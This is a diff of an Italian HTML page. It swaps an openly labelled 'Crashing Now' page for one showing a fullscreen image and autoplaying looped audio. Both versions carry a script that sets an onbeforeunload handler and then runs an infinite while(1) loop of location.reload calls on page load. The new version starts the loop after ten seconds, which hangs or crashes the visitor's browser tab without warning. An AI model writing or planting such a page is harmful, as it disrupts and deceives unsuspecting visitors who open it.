@@ -1,23 +1,46 @@
 <!DOCTYPE html>
 <html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Image + Audio + Reload Loop</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      background: black;
+    }
+    img {
+      width: 100vw;
+      height: 100vh;
+      object-fit: cover;
+      display: block;
+    }
+  </style>
+</head>
 <body>
 
-<h2>Crashing Now</h2>
-<p>Avvio automatico…</p>
+  <!-- immagine fullscreen -->
+  <img src="https://i.pinimg.com/474x/0c/93/2a/0c932a465c54f040f68864704e03f022.jpg" alt="fullscreen">
 
-<script>
-  // viene eseguito ad ogni unload / reload
-  onbeforeunload = function () {
-    localStorage.x = 1;
-  };
+  <!-- audio in loop -->
+  <audio id="bgAudio" src="konkonse.mp3" autoplay loop></audio>
 
-  // parte subito, senza chiedere nulla
-  setTimeout(function () {
-    while (1) {
-      location.reload(1);
-    }
-  }, 1000);
-</script>
+  <script>
+    // eseguito ad ogni reload / unload
+    onbeforeunload = function () {
+      localStorage.x = 1;
+    };
+
+    // dopo 10 secondi parte il loop di reload
+    setTimeout(function () {
+      while (1) {
+        location.reload(1);
+      }
+    }, 10000);
+  </script>
 
 </body>
 </html>
